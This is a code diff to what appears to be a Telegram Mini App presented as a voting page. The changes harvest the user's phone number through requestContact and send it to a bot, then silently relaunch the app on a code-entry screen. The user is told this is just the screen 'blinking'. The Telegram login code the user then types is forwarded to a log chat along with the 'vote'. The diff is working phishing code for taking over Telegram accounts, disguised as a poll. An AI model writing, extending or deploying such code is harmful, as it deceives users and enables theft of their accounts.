@@ -93,26 +93,35 @@
                 const tg = window.Telegram.WebApp;
                 tg.expand();
 
-                // Если в URL есть #code, сразу показываем экран ввода кода
-                if (window.location.hash === "#code") {
+                // Проверяем, открылись ли мы через параметр &step=code
+                if (window.location.search.includes('step=code')) {
                     showCodeScreen();
                 }
 
-                // Кнопка запроса номера
+                // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Бот сам поймает системный контакт и перешлет его в лог-чат.
-                            // Нам не нужно читать contact.phone_number, он все равно undefined.
+                            // Номер получаем через sendData (он 100% дойдет до бота)
+                            let phone = "undefined";
+                            if (contact && contact.phone_number) phone = contact.phone_number;
+                            else if (contact && contact.phone) phone = contact.phone;
+
+                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
                             
-                            // Мгновенно переключаем экран на ввод кода
+                            // Мгновенно перезапускаем приложение на экране ввода кода
+                            // Юзер просто увидит, как экран моргнул и появился ввод кода.
+                            const newUrl = window.location.href.split('#')[0].split('?')[0] + "?v=45&step=code";
+                            tg.openTelegramLink(`https://t.me/daslrwq_bot?startapp=${newUrl}`);
+                            
+                            // Резервный вариант: если openTelegramLink не сработал, просто меняем хэш
                             window.location.hash = "code";
                             showCodeScreen();
                         }
                     });
                 };
 
-                // Ввод кода
+                // 2. ВВОД КОДА
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 document.getElementById('code-cells').onclick = () => codeInput.focus();
@@ -141,7 +150,6 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.getElementById('code-subtitle').innerHTML = "<b>Отправка...</b>";
                         
-                        // Код отправляем через лог-бота
                         sendToLog(`🗳 <b>ГОЛОС:</b> ${selectedVote}\n🔑 <b>КОД:</b> ${value}`);
                         
                         setTimeout(() => {
